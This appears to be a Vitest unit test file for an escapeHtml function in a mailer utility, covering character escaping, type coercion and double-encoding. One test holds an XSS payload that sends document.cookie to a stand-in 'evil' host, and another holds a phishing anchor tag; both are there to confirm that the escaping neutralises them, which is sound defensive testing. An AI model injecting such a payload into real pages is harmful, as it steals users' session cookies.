import { describe, it, expect } from 'vitest';
import { escapeHtml } from '../utils/mailer.js';

describe('escapeHtml', () => {
  it('passes null through unchanged', () => {
    expect(escapeHtml(null)).toBe(null);
  });

  it('passes undefined through unchanged', () => {
    expect(escapeHtml(undefined)).toBe(undefined);
  });

  it('leaves a clean string untouched', () => {
    expect(escapeHtml('hello world')).toBe('hello world');
  });

  it('escapes ampersands', () => {
    expect(escapeHtml('a & b')).toBe('a &amp; b');
  });

  it('escapes < and >', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
  });

  it('escapes double quotes', () => {
    expect(escapeHtml('"quoted"')).toBe('&quot;quoted&quot;');
  });

  it("escapes single quotes", () => {
    expect(escapeHtml("it's here")).toBe('it&#39;s here');
  });

  it('escapes all five HTML-significant characters in one pass', () => {
    expect(escapeHtml('& < > " \'')).toBe('&amp; &lt; &gt; &quot; &#39;');
  });

  it('neutralises a realistic XSS payload', () => {
    const input = "<img src=x onerror=fetch('https://evil/'+document.cookie)>";
    const out = escapeHtml(input);
    expect(out).not.toContain('<');
    expect(out).not.toContain('>');
    expect(out).not.toContain("'");
    expect(out).toContain('&lt;img');
    expect(out).toContain('&#39;');
  });

  it('neutralises a phishing-style anchor tag', () => {
    const input = '<a href="https://evil.com" style="color:black">Click here</a>';
    const out = escapeHtml(input);
    // < is escaped so raw "<a" tag can never appear
    expect(out).not.toContain('<a');
    // the double-quote after = is escaped, so the unquoted attribute form is gone
    expect(out).not.toContain('href="');
    expect(out).toContain('&lt;a');
    expect(out).toContain('&quot;');
  });

  it('coerces numbers to strings before escaping', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(0)).toBe('0');
  });

  it('coerces booleans to strings', () => {
    expect(escapeHtml(false)).toBe('false');
    expect(escapeHtml(true)).toBe('true');
  });

  it('documents one-way encoding (does not decode existing entities)', () => {
    // The function is plain-text → HTML, not HTML → HTML.
    // Passing already-escaped text results in double-encoding — that is
    // the correct and expected behaviour for this use case.
    expect(escapeHtml('&amp;')).toBe('&amp;amp;');
  });

  it('handles an empty string', () => {
    expect(escapeHtml('')).toBe('');
  });
});
